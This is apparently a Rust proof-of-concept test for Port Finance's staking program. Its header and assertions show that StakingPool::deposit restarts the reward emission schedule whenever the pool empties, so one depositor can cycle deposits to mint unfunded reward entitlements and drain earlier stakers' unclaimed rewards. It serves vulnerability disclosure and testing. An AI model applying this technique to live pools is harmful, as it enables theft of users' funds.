//! PoC: `StakingPool::deposit` restarts the whole emission schedule every time
//! the pool empties, so a pool funded for `supply` tokens can promise stakers
//! an unbounded multiple of `supply`.
//!
//! `StakingPool::init` derives `rate_per_slot = supply / duration`, so the
//! pool is funded for exactly `rate_per_slot * duration` tokens. But
//! `StakingPool::deposit` contains:
//!
//! ```text
//! if self.pool_size == 0u64 {
//!     self.end_time = current_time.checked_add(self.duration)?;
//!     self.last_update = current_time;
//! }
//! ```
//!
//! That branch exists to start the clock on the first-ever deposit, but it
//! fires on *every* deposit that finds the pool empty, pushing `end_time` out
//! by another full `duration` at the unchanged `rate_per_slot` without any new
//! reward tokens being transferred in. Nothing in the staking program or in the
//! lending program's `deposit_to_staking_program` restricts who can trigger it:
//! for a Port reserve-linked pool, `pool_size` is just the total obligation
//! collateral deposited against that reserve, so a sole depositor empties and
//! refills the pool at will.
//!
//! Each cycle accrues another `supply` worth of `cumulative_rate`. Because
//! `ClaimReward` pays out of a token pool that only ever received `supply`,
//! the surplus claims are first-come-first-served: a staker who arrives after a
//! restart can drain balance that earlier stakers accrued and had not claimed.

use port_finance_staking::math::{Decimal, TryMul};
use port_finance_staking::state::stake_account::StakeAccount;
use port_finance_staking::state::staking_pool::StakingPool;

const SUPPLY: u64 = 1_000_000;
const DURATION: u64 = 1_000;
const STAKE: u64 = 1_000;

fn new_pool() -> StakingPool {
    let mut pool = StakingPool::default();
    pool.init(
        /* owner_authority */ Default::default(),
        /* admin_authority */ Default::default(),
        /* reward_token_pool_pubkey */ Default::default(),
        /* sub_reward_token_pool_pubkey */ None,
        DURATION,
        SUPPLY,
        /* sub_supply */ None,
        /* earliest_reward_claim_time */ 0,
        /* bump_seed_staking_program */ 0,
    )
    .unwrap();
    pool
}

/// One full emission cycle: deposit at `start`, let the schedule run out,
/// withdraw everything. Returns the reward the staker banked.
fn run_one_cycle(pool: &mut StakingPool, start: u64) -> u64 {
    let mut stake = StakeAccount::default();

    let rate = pool.deposit(start, STAKE).unwrap();
    stake.deposit(rate, STAKE).unwrap();

    // Run well past end_time; accrual is capped at end_time by
    // `claim_reward_helper`'s `min(current_time, self.end_time)`.
    let end = pool.end_time + 500;

    let rate = pool.withdraw(end, STAKE).unwrap();
    stake.withdraw(rate, STAKE).unwrap();

    let (claimed, _) = stake.claim_reward(pool.cumulative_rate).unwrap();
    claimed
}

#[test]
fn emission_schedule_restarts_every_time_the_pool_empties() {
    let mut pool = new_pool();

    // The pool was funded for exactly `supply` tokens.
    let funded = pool
        .rate_per_slot
        .reward
        .try_mul(DURATION)
        .unwrap()
        .try_floor_u64()
        .unwrap();
    assert_eq!(funded, SUPPLY, "pool is funded for rate_per_slot * duration");

    // Cycle 1: the intended schedule. The sole staker earns the whole supply.
    let first = run_one_cycle(&mut pool, 0);
    assert_eq!(pool.pool_size, 0, "pool is empty after the cycle");
    assert_eq!(
        first, SUPPLY,
        "a sole staker over the full window earns the whole funded supply"
    );

    // The schedule has run its course: end_time has passed and the pool is
    // empty, so emission should be over for good.
    let end_time_after_first = pool.end_time;

    // Cycle 2: deposit again. The `pool_size == 0` branch silently restarts.
    let second = run_one_cycle(&mut pool, end_time_after_first + 1_000);

    assert!(
        pool.end_time > end_time_after_first,
        "end_time was pushed out by a fresh deposit: {} -> {}",
        end_time_after_first,
        pool.end_time
    );
    assert_eq!(
        second, SUPPLY,
        "the restarted schedule emits another full supply with no new funding"
    );

    // And it keeps going, indefinitely.
    let third_start = pool.end_time + 1_000;
    let third = run_one_cycle(&mut pool, third_start);
    assert_eq!(third, SUPPLY);

    let total_promised = first + second + third;
    assert_eq!(
        total_promised,
        3 * SUPPLY,
        "three cycles promised 3x what the pool was ever funded with"
    );

    // The cumulative rate - the number every stake account prices its
    // entitlement off - has grown to 3x the funded total per staked unit.
    let per_unit = pool.cumulative_rate.reward;
    assert_eq!(
        per_unit
            .try_mul(STAKE)
            .unwrap()
            .try_floor_u64()
            .unwrap(),
        3 * SUPPLY,
    );

    // A staker who shows up only now, after two unfunded restarts, can still
    // accrue against whatever balance is left in the reward token account -
    // balance that belongs to the earlier cycles' unclaimed rewards.
    assert!(
        per_unit > Decimal::zero(),
        "late stakers accrue against an already-exhausted token pool"
    );
}
